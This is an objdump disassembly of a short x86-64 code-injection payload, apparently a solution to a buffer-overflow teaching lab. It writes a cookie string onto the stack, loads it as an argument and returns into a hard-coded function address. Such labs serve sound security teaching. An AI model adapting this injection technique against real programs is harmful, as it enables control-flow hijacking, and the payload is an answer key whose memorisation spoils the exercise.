
c3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 8d 84 24 56 02 00 	lea    0x256(%rsp),%rax
   7:	00 
   8:	c7 00 35 39 62 39    	movl   $0x39623935,(%rax)
   e:	c7 40 04 39 37 66 61 	movl   $0x61663739,0x4(%rax)
  15:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%rax)
  1c:	48 89 c7             	mov    %rax,%rdi
  1f:	48 c7 04 24 fa 18 40 	movq   $0x4018fa,(%rsp)
  26:	00 
  27:	c3                   	retq   
